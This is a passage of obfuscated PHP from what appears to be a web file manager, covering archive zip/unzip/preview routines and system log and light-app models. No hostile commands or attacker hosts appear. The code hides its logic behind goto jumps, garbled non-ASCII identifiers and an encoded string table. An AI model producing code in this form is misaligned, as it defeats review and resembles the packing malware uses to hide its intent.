$d·“ˆ‚¥¹[$A ©ç»ã[75]]; $eŒß½‡ù¼ƒ = array($A ©ç»ã[1013] => $A ©ç»ã[1022]); break; } $c”æ¥­ÔÃ = $d·“ˆ‚¥¹[$A ©ç»ã[75]]; if (!isset(self::$driverCache[$c”æ¥­ÔÃ])) { $b²æ¦ß¤° = strtolower($eŒß½‡ù¼ƒ[$A ©ç»ã[90]]); $d›˜äÒÉµ = $GLOBALS[$A ©ç»ã[6]][$A ©ç»ã[84]][$A ©ç»ã[1023]]; $eù¦ÚÆÄŠ« = $A ©ç»ã[71] . (isset($d›˜äÒÉµ[$b²æ¦ß¤°]) ? $d›˜äÒÉµ[$b²æ¦ß¤°] : ucfirst($b²æ¦ß¤°)); if (!class_exists($eù¦ÚÆÄŠ«)) { show_json("{$eù¦ÚÆÄŠ«}\40\x6e\x6f\164\40\145\170\x69\163\x74\163\41", !1); } $c¯æ”‚ã‰£ = isset($eŒß½‡ù¼ƒ[$A ©ç»ã[6]]) ? $eŒß½‡ù¼ƒ[$A ©ç»ã[6]] : !1; self::$driverCache[$c”æ¥­ÔÃ] = new $eù¦ÚÆÄŠ«($c¯æ”‚ã‰£); } goto dÌšš¹‰; d†‰»Š®µ: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $E½ñÂë­–‹; if (!$E½ñÂë­–‹) { $aó®À™¨Š¬ = IO::init($_SERVER[Æ][8]); } return $aó®À™¨Š¬; } private static function iconvSystem($D¿Êçñâ¢Ÿ) { return self::local()->iconvSystem($D¿Êçñâ¢Ÿ); } private static function iconvApp($b½›®ó‰©¼) { return self::local()->iconvApp($b½›®ó‰©¼); } public static function zip($CŒØòå®¿ñ, $f©¬äóŠßñ = "\172\151\160", $d¤À³»«Š† = '', $b¹œ†õâŒ = REPEAT_RENAME) { goto e¥äğâÂè; F¶ÑİÖ¬ïì: if (!$e«¼‚»‹…×) { del_dir($eÙ‹‰˜Œ×‚); show_json(LNG($bÚ–Â¸­[1027]), !1); } del_dir($eÙ‹‰˜Œ×‚); return $e«¼‚»‹…×; goto C©«èö¬¸ê; e¥äğâÂè: $bÚ–Â¸­ =& $_SERVER[Æ]; $eä £œÑ‰ = self::init($CŒØòå®¿ñ[0][$bÚ–Â¸­[75]]); $d±§ãô¢ë½ = self::info($CŒØòå®¿ñ[0][$bÚ–Â¸­[75]]); goto BŠï”ˆöæê; D™…ªÆŒ›: foreach ($Dç¡¶ªÎ‹Š as $CÀ°‚„·¤Ğ => $b¤—æ‘…ÄŠ) { $Dç¡¶ªÎ‹Š[$CÀ°‚„·¤Ğ] = self::iconvSystem($b¤—æ‘…ÄŠ); } KodArchive::create($FÃÃ²Ù°âö, $Dç¡¶ªÎ‹Š); if (!IO::exist($CåÍµ¨äó¿)) { if ($eÙ‹‰˜Œ×‚) { del_dir($eÙ‹‰˜Œ×‚); } show_json(LNG($bÚ–Â¸­[1027]), !1); } goto f‡êßŠàÉ; f‡êßŠàÉ: if ($d¤À³»«Š† || !$eÙ‹‰˜Œ×‚) { if ($eÙ‹‰˜Œ×‚ && strstr($eÙ‹‰˜Œ×‚, TEMP_FILES)) { $A•Ş–„îò = $Dç¡¶ªÎ‹Š = array(); recursion_dir($CŠ§°ÅŠ Š, $A•Ş–„îò, $Dç¡¶ªÎ‹Š, 0); foreach ($A•Ş–„îò as $aÕ¹½°Áá) { del_dir($aÕ¹½°Áá); } foreach ($Dç¡¶ªÎ‹Š as $aÕãŒÕ ·ç) { if ($aÕãŒÕ ·ç == $FÃÃ²Ù°âö) { continue; } del_file($aÕãŒÕ ·ç); } } return $CåÍµ¨äó¿; } $f†áËÛâ‰ì = self::pathFather($d±§ãô¢ë½[$bÚ–Â¸­[75]]); $e«¼‚»‹…× = self::move($CåÍµ¨äó¿, $f†áËÛâ‰ì, $b¹œ†õâŒ); goto F¶ÑİÖ¬ïì; Eºå‰òùç‡: if (count($Dç¡¶ªÎ‹Š) > 1) { $cï»ñ¾‘¿ = IO::info(IO::pathFather($d±§ãô¢ë½[$bÚ–Â¸­[75]])); $FÖÛ¾½õ• = $cï»ñ¾‘¿[$bÚ–Â¸­[28]]; } $CŠ§°ÅŠ Š = $eÙ‹‰˜Œ×‚; if (!$CŠ§°ÅŠ Š) { $CŠ§°ÅŠ Š = get_path_father($d±§ãô¢ë½[$bÚ–Â¸­[75]]); $d¸‘±È»Õ = IO::info($CŠ§°ÅŠ Š); if (!$d¸‘±È»Õ[$bÚ–Â¸­[189]]) { show_json(LNG($bÚ–Â¸­[1026]), !1); } } goto A‘¼¸£Š”ö; BŠï”ˆöæê: $eÙ‹‰˜Œ×‚ = !1; if (!$d¤À³»«Š† && $eä £œÑ‰->getType() == $bÚ–Â¸­[102]) { $Dç¡¶ªÎ‹Š = self::zipFileList($CŒØòå®¿ñ); } else { $eÙ‹‰˜Œ×‚ = $d¤À³»«Š† ? $d¤À³»«Š† : TEMP_FILES . $bÚ–Â¸­[1025] . time() . rand_string(8) . $bÚ–Â¸­[8]; mk_dir($eÙ‹‰˜Œ×‚); $Dç¡¶ªÎ‹Š = self::zipFileList($CŒØòå®¿ñ, $eÙ‹‰˜Œ×‚); } $FÖÛ¾½õ• = $d±§ãô¢ë½[$bÚ–Â¸­[28]]; goto Eºå‰òùç‡; A‘¼¸£Š”ö: $CåÍµ¨äó¿ = $CŠ§°ÅŠ Š . $FÖÛ¾½õ• . $bÚ–Â¸­[91] . $f©¬äóŠßñ; $CåÍµ¨äó¿ = get_filename_auto($CåÍµ¨äó¿, $bÚ–Â¸­[33], $b¹œ†õâŒ); $FÃÃ²Ù°âö = self::iconvSystem($CåÍµ¨äó¿); goto D™…ªÆŒ›; C©«èö¬¸ê: } public static function unzip($c•Ûë¶”¸•, $A‘Ùéªí· = "\x72\145\160\154\x61\x63\x65") { goto E·„œœ‰¤¶; b±ÒØ¹ößÁ: if (!@file_exists(self::iconvSystem($EèÛÓÇ÷))) { $dø¦İ«„í = self::localFilePath($eïØ©ÍäÇÀ, $eÜÓÏ³ÚÑ); $EèÛÓÇ÷ = $dø¦İ«„í ? $dø¦İ«„í : parent::download($eïØ©ÍäÇÀ, $EèÛÓÇ÷); } $EèÛÓÇ÷ = self::iconvSystem($EèÛÓÇ÷); $DŞÍÉÆ = isset($c•Ûë¶”¸•[$a³ğö¬…æÏ[1030]]) ? $c•Ûë¶”¸•[$a³ğö¬…æÏ[1030]] : $a³ğö¬…æÏ[1031]; goto eœÂ¾Ö„ø; A½²ÂñåÚ§: $a·¬µ§ÓŠ– = self::tmpFileName($f±“è™ï…); $dĞ˜¢œÌ¼ = TEMP_FILES . $a·¬µ§ÓŠ–; del_dir($dĞ˜¢œÌ¼); goto FùÈĞœ£¥å; eœÂ¾Ö„ø: $cÌ¯†ÖÙ¤• = KodArchive::extract($EèÛÓÇ÷, $dĞ˜¢œÌ¼ . $a³ğö¬…æÏ[8], $DŞÍÉÆ); self::archiveExt(); if (!$cÌ¯†ÖÙ¤•[$a³ğö¬…æÏ[1032]]) { show_json($a³ğö¬…æÏ[1033] . $cÌ¯†ÖÙ¤•[$a³ğö¬…æÏ[1034]], !1); } goto D¡‹ê®Ğ ˜; C‰îƒİ’…: foreach ($B»œÊÌ¾‘ as $aè©Û­ç) { $aè©Û­ç = self::iconvApp($aè©Û­ç); self::move($aè©Û­ç, $c©ã‡‡ÎÕî, $A‘Ùéªí·); } del_dir($dĞ˜¢œÌ¼); if (!$dø¦İ«„í) { del_file($EèÛÓÇ÷); } goto a†Ã§öÃ®; FùÈĞœ£¥å: mk_dir($dĞ˜¢œÌ¼); $eÜÓÏ³ÚÑ = self::fileExt($f±“è™ï…); $EèÛÓÇ÷ = $dĞ˜¢œÌ¼ . $a³ğö¬…æÏ[91] . $eÜÓÏ³ÚÑ; goto b±ÒØ¹ößÁ; E·„œœ‰¤¶: $a³ğö¬…æÏ =& $_SERVER[Æ]; $eïØ©ÍäÇÀ = $c•Ûë¶”¸•[$a³ğö¬…æÏ[75]]; $c©ã‡‡ÎÕî = $c•Ûë¶”¸•[$a³ğö¬…æÏ[1028]]; goto C¡±¸´ø‚ˆ; C¡±¸´ø‚ˆ: if (!($f±“è™ï… = parent::info($eïØ©ÍäÇÀ))) { show_json(LNG($a³ğö¬…æÏ[1029]), !1); } if (!($Dæ éÏ²ä† = parent::infoFull($c©ã‡‡ÎÕî))) { $c©ã‡‡ÎÕî = parent::mkdir($c©ã‡‡ÎÕî); $Dæ éÏ²ä† = array($a³ğö¬…æÏ[75] => $c©ã‡‡ÎÕî); } else { if (isset($Dæ éÏ²ä†[$a³ğö¬…æÏ[369]]) && trim($Dæ éÏ²ä†[$a³ğö¬…æÏ[75]], $a³ğö¬…æÏ[8]) != trim($c©ã‡‡ÎÕî, $a³ğö¬…æÏ[8])) { $C–¯Ëîé« = KodIO::make($Dæ éÏ²ä†[$a³ğö¬…æÏ[461]]); $CˆÁÓñ¤‹š = parent::fileNameAuto($C–¯Ëîé«, $Dæ éÏ²ä†[$a³ğö¬…æÏ[28]], REPEAT_RENAME_FOLDER, !0); $c©ã‡‡ÎÕî = parent::mkdir($C–¯Ëîé« . $CˆÁÓñ¤‹š); $Dæ éÏ²ä† = array($a³ğö¬…æÏ[75] => $c©ã‡‡ÎÕî); } } $c©ã‡‡ÎÕî = $Dæ éÏ²ä†[$a³ğö¬…æÏ[75]]; goto A½²ÂñåÚ§; a†Ã§öÃ®: return !0; goto a·¥éÇä¶Ü; D¡‹ê®Ğ ˜: Hook::trigger($a³ğö¬…æÏ[1035], $dĞ˜¢œÌ¼); recursion_dir($dĞ˜¢œÌ¼, $BµÁö«‰Ÿ, $d‘ºŒÑ¿­Ÿ, 0); $B»œÊÌ¾‘ = array_merge($BµÁö«‰Ÿ, $d‘ºŒÑ¿­Ÿ); goto C‰îƒİ’…; a·¥éÇä¶Ü: } public static function unzipList($C¾é œ‚•¿) { goto b£¤ò½â¯®; fê™¨“†æõ: $aéÓÜ„¸„ö = 50000; if (request_url_safe($dã·È¥¬Òâ)) { $E§¸¹«£š = parse_url_query($dã·È¥¬Òâ); if (!isset($E§¸¹«£š[$bô¼÷Åñø[75]])) { show_json($bô¼÷Åñø[1037], !1); } } $AŸÏãŞšò£ = isset($E§¸¹«£š) ? $E§¸¹«£š[$bô¼÷Åñø[75]] : $dã·È¥¬Òâ; goto aîŠæòéßÔ; f±˜½È¹ÉÎ: if (isset($E§¸¹«£š)) { $eéâù”·ßŸ = array($E§¸¹«£š[$bô¼÷Åñø[75]], $E§¸¹«£š[$bô¼÷Åñø[1036]], $E§¸¹«£š[$bô¼÷Åñø[28]]); $a©°—†â«Ò = md5(implode($bô¼÷Åñø[70], $eéâù”·ßŸ)) . $bô¼÷Åñø[91] . get_path_ext($E§¸¹«£š[$bô¼÷Åñø[28]]); } else { $eéâù”·ßŸ = array($F«ßÑ‚Ãù…[$bô¼÷Åñø[28]], $F«ßÑ‚Ãù…[$bô¼÷Åñø[75]], $F«ßÑ‚Ãù…[$bô¼÷Åñø[77]]); $a©°—†â«Ò = md5(implode($bô¼÷Åñø[70], $eéâù”·ßŸ)) . $bô¼÷Åñø[91] . $eß¡‚Ø“¬‘; } if ($F¯…›³® == -1) { $cåß™ÆÛŞÒ = IO_PATH_SYSTEM_TEMP . "\x7a\x69\160\x56\151\145\167\x2f{$c„ñ¿³¥É÷}\57{$a©°—†â«Ò}\56\154\x6f\x67"; $a¢¯¸¦Œ‚¡ = self::infoFull($cåß™ÆÛŞÒ); if ($a¢¯¸¦Œ‚¡) { $cåß™ÆÛŞÒ = $a¢¯¸¦Œ‚¡[$bô¼÷Åñø[75]]; $A®°—£‰´ã = self::getContent($cåß™ÆÛŞÒ); if ($A®°—£‰´ã) { $D¢½»“ÙÆ = json_decode($A®°—£‰´ã, !0); if (count($D¢½»“ÙÆ) >= $aéÓÜ„¸„ö) { show_json(sprintf(LNG($bô¼÷Åñø[1038]), count($D¢½»“ÙÆ)), !1); } return $D¢½»“ÙÆ; } } else { $cåß™ÆÛŞÒ = self::mkfile($cåß™ÆÛŞÒ); } } $EÓàç´ï– = TEMP_FILES . $c„ñ¿³¥É÷; goto E“‡æ‰±¥­; E“‡æ‰±¥­: if (!is_dir($EÓàç´ï–)) { mk_dir($EÓàç´ï–); } $dôÇ™¥Š«’ = $EÓàç´ï– . $bô¼÷Åñø[8] . $a©°—†â«Ò; if (!@file_exists(self::iconvSystem($dôÇ™¥Š«’))) { if (isset($E§¸¹«£š)) { url_request($dã·È¥¬Òâ, $bô¼÷Åñø[1039], $dôÇ™¥Š«’); } else { $Cè„²¼Œ„Î = self::localFilePath($dã·È¥¬Òâ, $eß¡‚Ø“¬‘); $dôÇ™¥Š«’ = $Cè„²¼Œ„Î ? $Cè„²¼Œ„Î : self::download($dã·È¥¬Òâ, $dôÇ™¥Š«’); } } goto eåßŞçãòÊ; eåßŞçãòÊ: $dôÇ™¥Š«’ = self::iconvSystem($dôÇ™¥Š«’); if ($F¯…›³® >= 0) { $CÑÛæÄ£ù = isset($C¾é œ‚•¿[$bô¼÷Åñø[1040]]) ? $C¾é œ‚•¿[$bô¼÷Åñø[1040]] : !1; $cí¹‚Ìƒ¬Ë = isset($C¾é œ‚•¿[$bô¼÷Åñø[28]]) ? $C¾é œ‚•¿[$bô¼÷Åñø[28]] : $bô¼÷Åñø[33]; KodArchive::filePreview($dôÇ™¥Š«’, $F¯…›³®, $CÑÛæÄ£ù, $cí¹‚Ìƒ¬Ë); self::archiveExt(); die; } $dÎèŞ Ò„ = KodArchive::listContent($dôÇ™¥Š«’); goto aëîÑèë; aîŠæòéßÔ: $F«ßÑ‚Ãù… = self::info($AŸÏãŞšò£); $eß¡‚Ø“¬‘ = self::fileExt($F«ßÑ‚Ãù…); $c„ñ¿³¥É÷ = self::tmpFileName($F«ßÑ‚Ãù…); goto f±˜½È¹ÉÎ; aƒ¼š¡ˆ¿ä: $D¢½»“ÙÆ = json_encode($dÎèŞ Ò„[$bô¼÷Åñø[1034]]); self::setContent($cåß™ÆÛŞÒ, $D¢½»“ÙÆ); if (count($dÎèŞ Ò„[$bô¼÷Åñø[1034]]) >= $aéÓÜ„¸„ö) { show_json(sprintf(LNG($bô¼÷Åñø[1038]), count($dÎèŞ Ò„[$bô¼÷Åñø[1034]])), !1); } goto f¯èøˆÛ“; b£¤ò½â¯®: $bô¼÷Åñø =& $_SERVER[Æ]; $dã·È¥¬Òâ = $C¾é œ‚•¿[$bô¼÷Åñø[75]]; $F¯…›³® = isset($C¾é œ‚•¿[$bô¼÷Åñø[1036]]) ? $C¾é œ‚•¿[$bô¼÷Åñø[1036]] : -1; goto fê™¨“†æõ; aëîÑèë: self::archiveExt(); del_dir($EÓàç´ï–); if (!$dÎèŞ Ò„[$bô¼÷Åñø[1032]]) { show_json($dÎèŞ Ò„[$bô¼÷Åñø[1034]], !1); } goto aƒ¼š¡ˆ¿ä; f¯èøˆÛ“: return $dÎèŞ Ò„[$bô¼÷Åñø[1034]]; goto aáßÔ‹´¡Ğ; aáßÔ‹´¡Ğ: } private static function fileExt($eæÅîŸŒŒ¢) { $D¸Š å°Ò =& $_SERVER[Æ]; $A¸ˆ·à«»¨ = $eæÅîŸŒŒ¢[$D¸Š å°Ò[160]]; if ($A¸ˆ·à«»¨ == $D¸Š å°Ò[1041]) { $dß°´½— = $D¸Š å°Ò[1042]; if (substr($eæÅîŸŒŒ¢[$D¸Š å°Ò[28]], -strlen($dß°´½—)) == $dß°´½—) { $A¸ˆ·à«»¨ = $D¸Š å°Ò[1043]; } } self::archiveExt($A¸ˆ·à«»¨); return $A¸ˆ·à«»¨; } private static function zipFileList($Fõ’ÕÀ‡¦², $F”ôâ·ÛôŞ = false) { $bé…¼°¸°™ =& $_SERVER[Æ]; $a¼ãšó¯« = array(); foreach ($Fõ’ÕÀ‡¦² as $eí¸¡Ø§â½) { $dÄ¨ùŠÍ = $eí¸¡Ø§â½[$bé…¼°¸°™[75]]; if ($F”ôâ·ÛôŞ) { $dÄ¨ùŠÍ = self::copy($eí¸¡Ø§â½[$bé…¼°¸°™[75]], $F”ôâ·ÛôŞ, $bé…¼°¸°™[743]); } if ($dÄ¨ùŠÍ && self::local()->exist($dÄ¨ùŠÍ)) { $a¼ãšó¯«[$eí¸¡Ø§â½[$bé…¼°¸°™[75]]] = $dÄ¨ùŠÍ; } } if (!empty($a¼ãšó¯«)) { return array_values($a¼ãšó¯«); } show_json(LNG($bé…¼°¸°™[1044]), !1); } public static function tmpFileName($DÄà®–ä¬ë) { $E÷‹ôª—ëƒ =& $_SERVER[Æ]; $e§³ë¸ˆé = array($DÄà®–ä¬ë[$E÷‹ôª—ëƒ[28]], $DÄà®–ä¬ë[$E÷‹ôª—ëƒ[75]], $DÄà®–ä¬ë[$E÷‹ôª—ëƒ[77]], $DÄà®–ä¬ë[$E÷‹ôª—ëƒ[459]]); return md5(implode($E÷‹ôª—ëƒ[70], $e§³ë¸ˆé)); } private static function localFilePath($d¹›»¨×İŠ, $CöÛÌ¦Üµ) { goto DŠÀÛ¯²ÁÑ; bÌĞ½—¯ïË: if ($bÒ³íÇäÂ÷[$eóˆª­ ˆÆ[29]] == KodIO::KOD_SOURCE) { $C¯Ö¯ï†®ö = Model($eóˆª­ ˆÆ[751])->fileInfoGet(KodIO::sourceID($d¹›»¨×İŠ)); if (!$C¯Ö¯ï†®ö[$eóˆª­ ˆÆ[75]]) { show_json($eóˆª­ ˆÆ[1047], !1); } $d¹›»¨×İŠ = $C¯Ö¯ï†®ö[$eóˆª­ ˆÆ[75]]; } $cŞ¸ß¼¥¢ = self::init($d¹›»¨×İŠ); $bÇÜŒ©ĞĞ¿ = $cŞ¸ß¼¥¢->getType(); goto Cğ‘ÖÛ¸º; Cğ‘ÖÛ¸º: if ($bÇÜŒ©ĞĞ¿ == $eóˆª­ ˆÆ[102] || $bÇÜŒ©ĞĞ¿ == $eóˆª­ ˆÆ[1048]) { if (!$cŞ¸ß¼¥¢->exist($cŞ¸ß¼¥¢->path)) { show_json(LNG($eóˆª­ ˆÆ[101]), !1); } return $cŞ¸ß¼¥¢->path; } return !1; goto f­˜™®ßƒè; DŠÀÛ¯²ÁÑ: $eóˆª­ ˆÆ =& $_SERVER[Æ]; if ($CöÛÌ¦Üµ == $eóˆª­ ˆÆ[1045] && strtoupper(substr(PHP_OS, 0, 3)) == $eóˆª­ ˆÆ[1046]) { return !1; } $bÒ³íÇäÂ÷ = KodIO::parse($d¹›»¨×İŠ); goto bÌĞ½—¯ïË; f­˜™®ßƒè: } private static function archiveExt($bÄÄÓ‚İœ¿ = '') { $GLOBALS[$_SERVER[Æ][1049]] = $bÄÄÓ‚İœ¿; } } goto C˜ßˆÔå•š; E¢À—°„ùØ: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\56\114\x69\x67\x68\164\x41\160\160"; public $modelType = "\123\x79\x73\x74\145\x6d\117\x70\x74\151\x6f\156"; public $field = array("\156\141\155\x65", "\147\x72\157\165\160", "\x64\x65\x73\143", "\x63\x6f\156\164\x65\x6e\164"); public function listData($e´„£·ƒ©  = false, $bĞÕÓœâä… = "\155\157\x64\x69\x66\x79\x54\x69\x6d\x65", $DÈØÕñ×†ˆ = true) { return parent::listData($e´„£·ƒ© , $bĞÕÓœâä…, $DÈØÕñ×†ˆ); } public function remove($Dò‚¬«„’) { $bğÑ¨“‡š = $this->findByName($Dò‚¬«„’); if (!$bğÑ¨“‡š) { return !1; } return parent::remove($bğÑ¨“‡š[$_SERVER[Æ][367]]); } public function add($BêšÄ¤¡İ) { if ($this->findByName($BêšÄ¤¡İ[$_SERVER[Æ][28]])) { return !1; } return parent::insert($BêšÄ¤¡İ); } public function update($FˆÁµîÜÏ­, $EçĞÚø…Ç¹) { $dœ‰Š—ˆö =& $_SERVER[Æ]; $FË¡íéåÛÉ = $this->findByName($FˆÁµîÜÏ­); $D¼¢˜¦‡ = $this->findByName($EçĞÚø…Ç¹[$dœ‰Š—ˆö[28]]); if (!$FË¡íéåÛÉ || $D¼¢˜¦‡ && $D¼¢˜¦‡[$dœ‰Š—ˆö[367]] != $FË¡íéåÛÉ[$dœ‰Š—ˆö[367]]) { return !1; } return parent::update($FË¡íéåÛÉ[$dœ‰Š—ˆö[367]], $EçĞÚø…Ç¹); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\x74\x65\x6d\137\154\157\147"; protected $dataAuto = array(array("\143\x72\145\141\x74\145\x54\x69\x6d\145", "\164\151\x6d\x65", "\x69\156\x73\x65\x72\x74", "\146\x75\156\x63\164\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $aÛ¬·éÌŞÈ =& $_SERVER[Æ]; return array($aÛ¬·éÌŞÈ[2375] => LNG($aÛ¬·éÌŞÈ[2376]), $aÛ¬·éÌŞÈ[2377] => LNG($aÛ¬·éÌŞÈ[2378]), $aÛ¬·éÌŞÈ[2041] => LNG($aÛ¬·éÌŞÈ[2379]), $aÛ¬·éÌŞÈ[2380] => LNG($aÛ¬·éÌŞÈ[2381]), $aÛ¬·éÌŞÈ[2382] => LNG($aÛ¬·éÌŞÈ[2383]), $aÛ¬·éÌŞÈ[2384] => LNG($aÛ¬·éÌŞÈ[2385]), $aÛ¬·éÌŞÈ[2386] => LNG($aÛ¬·éÌŞÈ[2387]), $aÛ¬·éÌŞÈ[2388] => LNG($aÛ¬·éÌŞÈ[2389]), $aÛ¬·éÌŞÈ[2072] => LNG($aÛ¬·éÌŞÈ[2390]), $aÛ¬·éÌŞÈ[2073] => LNG($aÛ¬·éÌŞÈ[2391]), $aÛ¬·éÌŞÈ[2392] => LNG($aÛ¬·éÌŞÈ[2393]), $aÛ¬·éÌŞÈ[2394] => LNG($aÛ¬·éÌŞÈ[2395]), $aÛ¬·éÌŞÈ[2396] => LNG($aÛ¬·éÌŞÈ[2397]), $aÛ¬·éÌŞÈ[2398] => LNG($aÛ¬·éÌŞÈ[2399]), $aÛ¬·éÌŞÈ[2070] => LNG($aÛ¬·éÌŞÈ[2400]), $aÛ¬·éÌŞÈ[2076] => LNG($aÛ¬·éÌŞÈ[2401]), $aÛ¬·éÌŞÈ[2402] => LNG($aÛ¬·éÌŞÈ[2403]), $aÛ¬·éÌŞÈ[2404] => LNG($aÛ¬·éÌŞÈ[2405]), $aÛ¬·éÌŞÈ[2406] => LNG($aÛ¬·éÌŞÈ[2407]), $aÛ¬·éÌŞÈ[2408] => LNG($aÛ¬·éÌŞÈ[2409]), $aÛ¬·éÌŞÈ[2079] => LNG($aÛ¬·éÌŞÈ[2410]), $aÛ¬·éÌŞÈ[2080] => LNG($aÛ¬·éÌŞÈ[2411]), $aÛ¬·éÌŞÈ[2412] => LNG($aÛ¬·éÌŞÈ[2413]), $aÛ¬·éÌŞÈ[2414] => LNG($aÛ¬·éÌŞÈ[2415]), $aÛ¬·éÌŞÈ[2416] => LNG($aÛ¬·éÌŞÈ[2417]), $aÛ¬·éÌŞÈ[2418] => LNG($aÛ¬·éÌŞÈ[2419]), $aÛ¬·éÌŞÈ[2420] => LNG($aÛ¬·éÌŞÈ[2421]), $aÛ¬·éÌŞÈ[2074] => LNG($aÛ¬·éÌŞÈ[2422]), $aÛ¬·éÌŞÈ[2423] => LNG($aÛ¬·éÌŞÈ[2424]), $aÛ¬·éÌŞÈ[2425] => LNG($aÛ¬·éÌŞÈ[2426]), $aÛ¬·éÌŞÈ[2427] => LNG($aÛ¬·éÌŞÈ[2427]), $aÛ¬·éÌŞÈ[2428] => LNG($aÛ¬·éÌŞÈ[2045]), $aÛ¬·éÌŞÈ[2429] => LNG($aÛ¬·éÌŞÈ[2430]), $aÛ¬·éÌŞÈ[2431] => LNG($aÛ¬·éÌŞÈ[2432]), $aÛ¬·éÌŞÈ[2433] => LNG($aÛ¬·éÌŞÈ[2434]), $aÛ¬·éÌŞÈ[2435] => LNG($aÛ¬·éÌŞÈ[2436]), $aÛ¬·éÌŞÈ[2437] => LNG($aÛ¬·éÌŞÈ[2438]), $aÛ¬·éÌŞÈ[2439] => LNG($aÛ¬·éÌŞÈ[2439]), $aÛ¬·éÌŞÈ[2440] => LNG($aÛ¬·éÌŞÈ[2441]), $aÛ¬·éÌŞÈ[2442] => LNG($aÛ¬·éÌŞÈ[2443]), $aÛ¬·éÌŞÈ[2444] => LNG($aÛ¬·éÌŞÈ[2445]), $aÛ¬·éÌŞÈ[2446] => LNG($aÛ¬·éÌŞÈ[2447]), $aÛ¬·éÌŞÈ[2448] => LNG($aÛ¬·éÌŞÈ[2449]), $aÛ¬·éÌŞÈ[2450] => LNG($aÛ¬·éÌŞÈ[2451])); } private function typeFile() { $c½äÜŠ‰ =& $_SERVER[Æ]; $Cå÷Ñã¯Çè = array($c½äÜŠ‰[2076] => array($c½äÜŠ‰[2077]), $c½äÜŠ‰[2396] => array($c½äÜŠ‰[2452]), $c½äÜŠ‰[2398] => array($c½äÜŠ‰[2453]), $c½äÜŠ‰[2070] => array($c½äÜŠ‰[2071]), $c½äÜŠ‰[2404] => array(), $c½äÜŠ‰[2406] => array(), $c½äÜŠ‰[2408] => array(), $c½äÜŠ‰[2079] => array($c½äÜŠ‰[2081]), $c½äÜŠ‰[2080] => array($c½äÜŠ‰[2081]), $c½äÜŠ‰[2412] => array($c½äÜŠ‰[2454]), $c½äÜŠ‰[2414] => array($c½äÜŠ‰[2454]), $c½äÜŠ‰[2416] => array($c½äÜŠ‰[2455]), $c½äÜŠ‰[2402] => array($c½äÜŠ‰[2456]), $c½äÜŠ‰[2418] => array($c½äÜŠ‰[2457]), $c½äÜŠ‰[2420] => array($c½äÜŠ‰[2458]), $c½äÜŠ‰[2074] => array($c½äÜŠ‰[2075])); return $Cå÷Ñã¯Çè; } private function typeAll() { goto DÉ¾İì›´å; bº›™¾¯ˆ±: return $f‰İâÏ”™Ä; goto A¶îŸ’˜È; E› «ƒòÑ¸: foreach ($F¤†ÓõÈ‡ as $dÀŞ˜Ğ’ÅÚ => $f¢ùïµÙ˜°) { $f‰İâÏ”™Ä[$f¢ùïµÙ˜°[0]] = $f‰İâÏ”™Ä[$dÀŞ˜Ğ’ÅÚ]; } $f‰İâÏ”™Ä[$c„•¶ÆÊÕĞ[2081]] = LNG($c„•¶ÆÊÕĞ[2459]); $f‰İâÏ”™Ä[$c„•¶ÆÊÕĞ[2454]] = LNG($c„•¶ÆÊÕĞ[2460]); goto bº›™¾¯ˆ±; DÉ¾İì›´å: $c„•¶ÆÊÕĞ =& $_SERVER[Æ]; $f‰İâÏ”™Ä = $this->typeList; $F¤†ÓõÈ‡ = array_filter($this->typeFile()); goto E› «ƒòÑ¸; A¶îŸ’˜È: } public function addLog($eØ•ë¡À»½, $c¼í÷‡©Ïè = array()) { goto CÒ·ä×ñ®ˆ; d‹÷ÔÔ¹ò: $c®…’ŒºŒì = get_client_ip(); if (!$c¼í÷‡©Ïè || strlen(json_encode($c¼í÷‡©Ïè)) >= 1024) { $c¼í÷‡©Ïè = array($bÒ‹†½²È[2461] => $c®…’ŒºŒì); } else { if (is_array($c¼í÷‡©Ïè)) { $c¼í÷‡©Ïè[$bÒ‹†½²È[2461]] = $c®…’ŒºŒì; } else { $c¼í÷‡©Ïè = array($bÒ‹†½²È[1034] => $c¼í÷‡©Ïè, $bÒ‹†½²È[2461] => $c®…’ŒºŒì); } } $c¼í÷‡©Ïè = array($bÒ‹†½²È[1424] => Session::sign(), $bÒ‹†½²È[1425] => $C’È¼‘äÒì, $bÒ‹†½²È[29] => $eØ•ë¡À»½, $bÒ‹†½²È[1427] => json_encode($c¼í÷‡©Ïè)); goto B©§í¡ö‹; B©§í¡ö‹: parent::add($c¼í÷‡©Ïè); goto A×ß•ïÂ ; CÒ·ä×ñ®ˆ: $bÒ‹†½²È =& $_SERVER[Æ]; if (!isset($this->typeList[$eØ•ë¡À»½])) { return; } $C’È¼‘äÒì = USER_ID ? USER_ID : (isset($c¼í÷‡©Ïè[$bÒ‹†½²È[1434]]) ? $c¼í÷‡©Ïè[$bÒ‹†½²È[1434]] : 0); goto d‹÷ÔÔ¹ò; A×ß•ïÂ : } public function remove($eñ¾‘Ñàˆ¤) { $this->where(array($_SERVER[Æ][385] => $eñ¾‘Ñàˆ¤))->delete(); } private function _makeOrder($cœÂ¤ƒê†• = '') { goto B¿ÂìÙƒò; B¿ÂìÙƒò: $F‡‡²§å— =& $_SERVER[Æ]; $B·†»Æ²¤ = $F‡‡²§å—[187]; $fÒ§›Ç¨Ó› = array($F‡‡²§å—[402] => $F‡‡²§å—[403], $F‡‡²§å—[404] => $F‡‡²§å—[405]); goto a©¨…Ÿ‹™ñ; Aùšñ‚ì¡È: return $this->order($cœÂ¤ƒê†•); goto C¿šÈÄØó·; a©¨…Ÿ‹™ñ: $c³‰ôïÍÜ = Input::get($F‡‡²§å—[408], $F‡‡²§å—[7], $F‡‡²§å—[2239], array($F‡‡²§å—[2176], $F‡‡²§å—[404])); $c³‰ôïÍÜ = $fÒ§›Ç¨Ó›[$c³‰ôïÍÜ]; $cœÂ¤ƒê†• = $cœÂ¤ƒê†• . "{$B·†»Æ²¤}\x20{$c³‰ôïÍÜ}"; goto Aùšñ‚ì¡È; C¿šÈÄØó·: } public function get($e³òéø‘õÕ = '') { goto b¥†¸—¡ß²; F¯¢â‹²•: if (!empty($e³òéø‘õÕ[$dÒˆ ù“ï[2461]])) { $F‚¦ƒÃŸå[$dÒˆ ù“ï[405]] = array($dÒˆ ù“ï[750], "\x25{$e³òéø‘õÕ[$dÒˆ ù“ï[2461]]}\45"); } $f˜òß¤¸” = $this->_makeOrder()->where($F‚¦ƒÃŸå)->selectPage(); if (empty($f˜òß¤¸”[$dÒˆ ù“ï[354]])) 